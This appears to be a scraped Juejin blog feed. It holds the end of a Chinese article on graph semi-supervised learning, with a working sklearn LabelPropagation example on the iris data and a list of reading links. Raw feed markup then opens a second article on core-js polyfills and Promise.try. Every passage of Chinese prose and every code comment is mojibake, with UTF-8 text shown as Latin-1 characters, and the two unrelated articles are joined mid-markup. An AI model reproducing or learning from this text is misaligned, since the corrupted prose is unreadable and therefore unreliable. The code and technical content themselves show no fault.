<p>å›¾æ­£åˆ™åŒ–æ–¹æ³•å°†å›¾ç»“æ„å¼•å…¥æŸå¤±å‡½æ•°ï¼Œé€šè¿‡å¢åŠ æ­£åˆ™åŒ–é¡¹é¼“åŠ±ç›¸è¿èŠ‚ç‚¹çš„é¢„æµ‹ç»“æœç›¸ä¼¼ã€‚å…¸å‹å½¢å¼æ˜¯æœ€å°åŒ–ä»¥ä¸‹ç›®æ ‡å‡½æ•°ï¼š</p>
<p>å…¶ä¸­ç¬¬ä¸€é¡¹æ˜¯æ ‡æ³¨èŠ‚ç‚¹çš„ç›‘ç£æŸå¤±ï¼Œç¬¬äºŒé¡¹æ˜¯å›¾å¹³æ»‘æ­£åˆ™åŒ–é¡¹ï¼ŒÎ» æ§åˆ¶å¹³æ»‘ç¨‹åº¦ã€‚</p>
<p>3.å›¾ç¥ç»ç½‘ç»œï¼ˆGraph Neural Networks, GNNsï¼‰</p>
<p>éšç€æ·±åº¦å­¦ä¹ çš„å‘å±•ï¼Œå›¾ç¥ç»ç½‘ç»œæˆä¸ºå›¾åŠç›‘ç£å­¦ä¹ çš„ä¸»æµæ–¹æ³•ã€‚GNNé€šè¿‡èŠ‚ç‚¹ç‰¹å¾çš„æ¶ˆæ¯ä¼ é€’æœºåˆ¶ï¼Œå°†é‚»å±…èŠ‚ç‚¹ä¿¡æ¯æ•´åˆåˆ°ç›®æ ‡èŠ‚ç‚¹è¡¨ç¤ºä¸­ï¼Œæ—¢èƒ½æ•æ‰å±€éƒ¨ç»“æ„ï¼Œåˆèƒ½åˆ©ç”¨æ ‡æ³¨ä¿¡æ¯è¿›è¡Œç«¯åˆ°ç«¯è®­ç»ƒã€‚å¸¸è§æ¨¡å‹åŒ…æ‹¬ GCNï¼ˆGraph Convolutional Networkï¼‰ã€GraphSAGEã€GATï¼ˆGraph Attention Networkï¼‰ç­‰ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨ sklearn çš„ LabelPropagation æ¥æ¼”ç¤ºå›¾åŠç›‘ç£å­¦ä¹ ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
<span class="hljs-keyword">from</span> sklearn.semi_supervised <span class="hljs-keyword">import</span> LabelPropagation
<span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split

<span class="hljs-comment"># 1. åŠ è½½æ•°æ®</span>
X, y = load_iris(return_X_y=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 2. éšæœºæŒ‘é€‰å¸¦æ ‡ç­¾æ ·æœ¬</span>
rng = np.random.RandomState(<span class="hljs-number">42</span>)
n_total = X.shape[<span class="hljs-number">0</span>]
n_labeled = <span class="hljs-number">15</span>  <span class="hljs-comment"># åªæ ‡æ³¨éƒ¨åˆ†æ ·æœ¬</span>
indices = np.arange(n_total)
rng.shuffle(indices)

y_semi = -np.ones(n_total)  <span class="hljs-comment"># æœªæ ‡æ³¨æ ·æœ¬ç”¨ -1 è¡¨ç¤º</span>
y_semi[indices[:n_labeled]] = y[indices[:n_labeled]]

<span class="hljs-comment"># 3. PCA é™ç»´ä¾¿äºå¯è§†åŒ–</span>
pca = PCA(n_components=<span class="hljs-number">2</span>)
X_2d = pca.fit_transform(X)

<span class="hljs-comment"># 4. æ„å»º LabelPropagation æ¨¡å‹</span>
label_prop_model = LabelPropagation(kernel=<span class="hljs-string">'rbf'</span>, gamma=<span class="hljs-number">20</span>)
label_prop_model.fit(X, y_semi)

<span class="hljs-comment"># 5. é¢„æµ‹æ‰€æœ‰æ ·æœ¬</span>
y_pred = label_prop_model.transduction_

<span class="hljs-comment"># 6. å¯è§†åŒ–ç»“æœ</span>
plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># åŸå§‹å¸¦æ ‡ç­¾æ ·æœ¬</span>
plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)
plt.scatter(X_2d[:, <span class="hljs-number">0</span>], X_2d[:, <span class="hljs-number">1</span>], c=<span class="hljs-string">'gray'</span>, alpha=<span class="hljs-number">0.5</span>, label=<span class="hljs-string">'Unlabeled'</span>)
plt.scatter(X_2d[indices[:n_labeled], <span class="hljs-number">0</span>], X_2d[indices[:n_labeled], <span class="hljs-number">1</span>], c=y[indices[:n_labeled]], cmap=<span class="hljs-string">'Set1'</span>, edgecolor=<span class="hljs-string">'k'</span>, s=<span class="hljs-number">80</span>)
plt.title(<span class="hljs-string">"Initial Labeled Samples"</span>)
plt.legend()

<span class="hljs-comment"># Label Propagation é¢„æµ‹ç»“æœ</span>
plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)
plt.scatter(X_2d[:, <span class="hljs-number">0</span>], X_2d[:, <span class="hljs-number">1</span>], c=y_pred, cmap=<span class="hljs-string">'Set1'</span>, edgecolor=<span class="hljs-string">'k'</span>, s=<span class="hljs-number">80</span>)
plt.title(<span class="hljs-string">"Label Propagation Prediction"</span>)
plt.show()
</code></pre>
<p>è¿è¡Œç»“æœä¸‹å›¾æ‰€ç¤ºï¼Œ</p>
<ol>
<li>å·¦å›¾ï¼šåˆå§‹å¸¦æ ‡ç­¾æ ·æœ¬å¾ˆå°‘ï¼ˆ15 ä¸ªï¼‰ï¼Œå¤§éƒ¨åˆ†æ ·æœ¬ä¸ºç°è‰²æœªæ ‡æ³¨ã€‚</li>
<li>å³å›¾ï¼šLabel Propagation åˆ©ç”¨å›¾ç»“æ„ï¼ˆRBF æ ¸æ„å»ºç›¸ä¼¼æ€§ï¼‰å°†æ ‡ç­¾ä»å°‘é‡æ ‡æ³¨æ ·æœ¬ä¼ æ’­åˆ°æ•´ä¸ªæ•°æ®é›†ï¼Œå‡ ä¹æ‰€æœ‰æœªæ ‡æ³¨æ ·æœ¬éƒ½è¢«æ­£ç¡®åˆ†ç±»ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f950d992edf469bb861fe296817e5db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529196&amp;x-signature=a%2F5ArtAPcgHSGXZO50aiYy0Xn4M%3D" alt="" loading="lazy"/></p>
<p>å›¾åŠç›‘ç£æ­£æ˜¯å­¦ä¹ å¦‚ä½•åˆ©ç”¨æ ·æœ¬é—´ç›¸ä¼¼æ€§ï¼Œå°†æ ‡æ³¨ä¿¡æ¯æ‰©æ•£åˆ°æœªæ ‡æ³¨æ ·æœ¬ï¼Œä»è€Œå®ç°é«˜æ•ˆé¢„æµ‹ã€‚</p>
<p>å›¾åŠç›‘ç£å­¦ä¹ åœ¨ç¤¾äº¤ç½‘ç»œä¸­ï¼Œå¯ä»¥åˆ©ç”¨éƒ¨åˆ†ç”¨æˆ·çš„å…´è¶£æ ‡ç­¾é¢„æµ‹å…¶ä»–ç”¨æˆ·çš„å…´è¶£åå¥½ï¼›åœ¨çŸ¥è¯†å›¾è°±ä¸­ï¼Œå¯ä»¥æ¨æ–­æœªæ ‡æ³¨å®ä½“çš„ç±»åˆ«æˆ–å…³ç³»ï¼›åœ¨åŒ–å­¦åˆ†å­æ•°æ®ä¸­ï¼Œå¯ä»¥æ ¹æ®å°‘é‡æ ‡æ³¨åˆ†å­æ€§è´¨é¢„æµ‹å…¶ä»–åˆ†å­çš„æ€§è´¨ï¼›åœ¨æ¨èç³»ç»Ÿä¸­ï¼Œé€šè¿‡ç”¨æˆ·æˆ–ç‰©å“ä¹‹é—´çš„å…³è”å›¾ï¼Œå®ç°å¯¹å†·å¯åŠ¨ç”¨æˆ·æˆ–ç‰©å“çš„é¢„æµ‹ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼Œå›¾åŠç›‘ç£å­¦ä¹ å……åˆ†åˆ©ç”¨æ•°æ®é—´çš„å…³ç³»ç»“æ„ï¼Œåœ¨æ ‡æ³¨æ ·æœ¬æœ‰é™çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æ ‡ç­¾ä¼ æ’­ã€å›¾æ­£åˆ™åŒ–æˆ–å›¾ç¥ç»ç½‘ç»œç­‰æ–¹æ³•ï¼Œå®ç°å¯¹æœªæ ‡æ³¨æ•°æ®çš„é«˜æ•ˆé¢„æµ‹ã€‚</p>
<p>ğŸ“š æ¨èé˜…è¯»</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485782%26idx%3D1%26sn%3D060c8222b47cbf903fbfded1f0421bcf%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485782&amp;idx=1&amp;sn=060c8222b47cbf903fbfded1f0421bcf&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¹‹æ•°æ®é¢„å¤„ç†ç¯‡ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485800%26idx%3D1%26sn%3Da52107c9dc7071d8530a24563861fa46%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485800&amp;idx=1&amp;sn=a52107c9dc7071d8530a24563861fa46&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ç‰¹å¾å·¥ç¨‹ä¸­çš„ç‰¹å¾é€‰æ‹©</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485808%26idx%3D1%26sn%3D2c57081d4b12433f6b8919209e2e52ed%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485808&amp;idx=1&amp;sn=2c57081d4b12433f6b8919209e2e52ed&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­çš„ç‰¹å¾æ„é€ </a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485820%26idx%3D1%26sn%3Dadcb41fd14347f2f1431709323fa253f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485820&amp;idx=1&amp;sn=adcb41fd14347f2f1431709323fa253f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¹‹ç‰¹å¾é™ç»´</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485941%26idx%3D1%26sn%3Dcb53a98bacd1cfbd3255bbeeab6a24ec%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485941&amp;idx=1&amp;sn=cb53a98bacd1cfbd3255bbeeab6a24ec&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚å±‚æ¬¡èšç±»å’Œå¯†åº¦èšç±»æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485946%26idx%3D1%26sn%3Da5cf50a4a3bda9785fb0c7baae3a6bb2%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485946&amp;idx=1&amp;sn=a5cf50a4a3bda9785fb0c7baae3a6bb2&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„PCAä¸»æˆåˆ†åˆ†æï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485952%26idx%3D1%26sn%3Dffe1fca4cb75b2f99ace92593554837c%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485952&amp;idx=1&amp;sn=ffe1fca4cb75b2f99ace92593554837c&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­ç‹¬ç«‹æˆåˆ†åˆ†æICAå’Œä¸»æˆåˆ†åˆ†æPCAæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485960%26idx%3D1%26sn%3D05cf98957ea11dcd6ae165588b4c91c7%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485960&amp;idx=1&amp;sn=05cf98957ea11dcd6ae165588b4c91c7&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚t-SNEå’ŒUMAPé™ç»´æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485972%26idx%3D1%26sn%3De106fcda9b02b7e8a6fb31495bb28dae%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485972&amp;idx=1&amp;sn=e106fcda9b02b7e8a6fb31495bb28dae&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„æ¦‚ç‡å›¾æ¨¡å‹</a></p>
<p>æœ€æ–°çš„æ–‡ç« éƒ½åœ¨å…¬ä¼—å·aicotingæ›´æ–°ï¼Œåˆ«å¿˜è®°å…³æ³¨å“¦ï¼ï¼ï¼</p>
<p>ä½œè€…ï¼šaicoting</p>
<p>åˆ†äº«æ˜¯ä¸€ç§ä¿¡ä»°ï¼Œè¿æ¥è®©æˆé•¿æ›´æœ‰æ¸©åº¦ã€‚</p>
<p>æˆ‘ä»¬ä¸‹æ¬¡ä¸è§ä¸æ•£ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Polyfillæ–¹å¼è§£å†³å‰ç«¯å…¼å®¹æ€§é—®é¢˜ï¼šcore-jsåŒ…ç»“æ„ä¸å„ç§é…ç½®ç­–ç•¥]]></title>    <link>https://juejin.cn/post/7597258378590846986</link>    <guid>https://juejin.cn/post/7597258378590846986</guid>    <pubDate>2026-01-20T15:57:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597258378590846986" data-draft-id="7597317683051429897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Polyfillæ–¹å¼è§£å†³å‰ç«¯å…¼å®¹æ€§é—®é¢˜ï¼šcore-jsåŒ…ç»“æ„ä¸å„ç§é…ç½®ç­–ç•¥"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T15:57:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¼‚æµç“¶jz"/> <meta itemprop="url" content="https://juejin.cn/user/3694779980078877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Polyfillæ–¹å¼è§£å†³å‰ç«¯å…¼å®¹æ€§é—®é¢˜ï¼šcore-jsåŒ…ç»“æ„ä¸å„ç§é…ç½®ç­–ç•¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3694779980078877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¼‚æµç“¶jz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:57:09.000Z" title="Tue Jan 20 2026 15:57:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç®€ä»‹</h2>
<p>åœ¨ä¹‹å‰æˆ‘ä»‹ç»è¿‡Babelï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">è§£é”Babelæ ¸å¿ƒåŠŸèƒ½ï¼šä»è½¬ä¹‰è¯­æ³•åˆ°æ’ä»¶å¼€å‘</a>ï¼ŒBabelæ˜¯ä¸€ä¸ªä½¿ç”¨ASTè½¬ä¹‰JavaScriptè¯­æ³•ï¼Œæé«˜ä»£ç åœ¨æµè§ˆå™¨å…¼å®¹æ€§çš„å·¥å…·ã€‚ä½†æœ‰äº›ECMAScriptå¹¶ä¸æ˜¯æ–°çš„è¯­æ³•ï¼Œè€Œæ˜¯ä¸€äº›æ–°å¯¹è±¡ï¼Œæ–°æ–¹æ³•ç­‰ç­‰ï¼Œè¿™äº›å¹¶ä¸èƒ½ä½¿ç”¨ASTæŠ½è±¡è¯­æ³•æ ‘æ¥è½¬ä¹‰ã€‚å› æ­¤Babelåˆ©ç”¨core-jså®ç°è¿™äº›ä»£ç çš„å…¼å®¹æ€§ã€‚</p>
<p>core-jsæ˜¯ä¸€ä¸ªçŸ¥åçš„å‰ç«¯å·¥å…·åº“ï¼Œé‡Œé¢åŒ…å«äº†ECMAScriptæ ‡å‡†ä¸­æä¾›çš„æ–°å¯¹è±¡/æ–°æ–¹æ³•ç­‰ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨æ—§ç‰ˆæœ¬æ”¯æŒçš„è¯­æ³•æ¥å®ç°è¿™äº›æ–°çš„APIã€‚è¿™æ ·å³ä½¿æµè§ˆå™¨æ²¡æœ‰å®ç°æ ‡å‡†ä¸­çš„æ–°APIï¼Œä¹Ÿèƒ½é€šè¿‡æ³¨å…¥core-jsä»£ç æ¥æä¾›å¯¹åº”çš„åŠŸèƒ½ã€‚</p>
<p>åƒè¿™ç§é€šè¿‡æ³¨å…¥ä»£ç å®ç°æµè§ˆå™¨æ²¡æœ‰æä¾›çš„APIç‰¹æ€§ï¼Œå«åšPolyfillã€‚è¿™ä¸ªå•è¯çš„æœ¬æ„æ˜¯å¡«å……ææ–™ï¼Œåœ¨JavaScripté¢†åŸŸä¸­ï¼Œè¿™äº›æ³¨å…¥çš„ä»£ç å°±ç±»ä¼¼â€œå¡«å……ææ–™â€ä¸€æ ·ï¼Œå¸®åŠ©æˆ‘ä»¬æé«˜ä»£ç çš„å…¼å®¹æ€§ã€‚å¦å¤–core-jsè¿˜æä¾›äº†ä¸€äº›è¿˜åœ¨æè®®ä¸­çš„APIçš„å®ç°ã€‚</p>
<h2 data-id="heading-1">core-jsä½¿ç”¨æ–¹å¼</h2>
<h3 data-id="heading-2">ä½¿ç”¨å‰åå¯¹æ¯”</h3>
<p>è¦æƒ³çœ‹åˆ°core-jsä½¿ç”¨å‰åçš„æ•ˆæœå¯¹æ¯”ï¼Œé¦–å…ˆéœ€è¦ç¡®å®šæŸä¸ªç‰¹æ€§å’Œå¯¹åº”çš„æ‰§è¡Œç¯å¢ƒï¼Œåœ¨è¿™ä¸ªç¯å¢ƒä¸­å¯¹åº”çš„ç‰¹æ€§ä¸å­˜åœ¨ã€‚æˆ‘æœ¬åœ°æ˜¯Node.js v18.19.1ç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬å¹¶æ²¡æœ‰å®ç°Promise.tryè¿™ä¸ªæ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬å°±ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œå®éªŒã€‚é¦–å…ˆæ˜¯æ²¡æœ‰å¼•å…¥core-jsçš„åœºæ™¯ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* æ‰§è¡Œç»“æœ
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¼•å…¥core-jsï¼Œç›´æ¥ä½¿ç”¨Promise.tryæ—¶ï¼Œä¼šå› ä¸ºæ²¡æœ‰è¯¥æ–¹æ³•è€ŒæŠ¥é”™ã€‚ç„¶åå†è¯•è¯•å¼•å…¥core-jsçš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°å¼•å…¥core-jsåï¼ŒåŸæœ¬ä¸å­˜åœ¨çš„APIè¢«å¡«å……äº†ï¼Œæˆ‘ä»¬çš„ä»£ç å¯ä»¥æ­£å¸¸æ‰§è¡Œå¹¶æ‹¿åˆ°ç»“æœäº†ã€‚è¿™å°±æ˜¯core-jsæé«˜å…¼å®¹æ€§çš„æ•ˆæœã€‚</p>
<h3 data-id="heading-3">å•ä¸ªAPIå¼•å…¥</h3>
<p>core-jsä¸ä»…å¯ä»¥ç›´æ¥å¼•å…¥å…¨éƒ¨è¯­æ³•ï¼Œè¿˜å¯ä»¥ä»…å¼•å…¥å•ä¸ªAPIï¼Œæ¯”å¦‚æŸä¸ªå¯¹è±¡æˆ–æŸä¸ªæ–¹æ³•ã€‚é¦–å…ˆçœ‹ä¸‹åªå¼•å…¥Promiseå¯¹è±¡ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// require('core-js/full') ç­‰äº require('core-js')</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
